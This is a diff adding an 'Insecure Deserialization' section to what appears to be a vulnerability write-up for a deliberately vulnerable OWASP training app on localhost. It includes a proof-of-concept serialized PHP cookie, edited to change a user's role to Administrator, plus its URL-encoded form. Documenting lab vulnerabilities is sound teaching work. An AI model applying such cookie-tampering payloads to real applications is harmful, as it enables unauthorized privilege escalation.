@@ -55,6 +55,31 @@ if (!empty($_GET['SESSID'])) {
 ```
 before `session_start()` anywhere in the project...
 
+### 8 - Insecure Deserialization
+
+> The application saves the role of the user in the cookie as well as in the session on the server side.
+> However, for apikey.php, the role check relies on both sides with an OR operator instead of an AND.
+> It results in a possible privilege escalation by modifying the serialized user stored in the `user` cookie.
+
+Proof of Concept :
+
+Regular serialized cookie string example for bob:
+```string
+a:5:{s:2:"id";s:1:"3";s:4:"role";s:7:"Regular";s:5:"login";s:3:"bob";s:9:"firstname";s:3:"Bob";s:8:"lastname";s:0:"";}
+```
+
+Privilege escalation for bob as Administrator:
+```string
+a:5:{s:2:"id";s:1:"3";s:4:"role";s:13:"Administrator";s:5:"login";s:3:"bob";s:9:"firstname";s:3:"Bob";s:8:"lastname";s:0:"";}
+```
+
+Privilege escalation encoded string (for cookie overload):
+```string
+a%3A5%3A%7Bs%3A2%3A%22id%22%3Bs%3A1%3A%223%22%3Bs%3A4%3A%22role%22%3Bs%3A13%3A%22Administrator%22%3Bs%3A5%3A%22login%22%3Bs%3A3%3A%22bob%22%3Bs%3A9%3A%22firstname%22%3Bs%3A3%3A%22Bob%22%3Bs%3A8%3A%22lastname%22%3Bs%3A0%3A%22%22%3B%7D
+```
+
+This hack is only possible on accessing `http://localhost/owasp/dashboard.php?view=apikey`
+
 ### 6 - Security Misconfiguration
 
 > Directory listing is disabled in path `/conf`
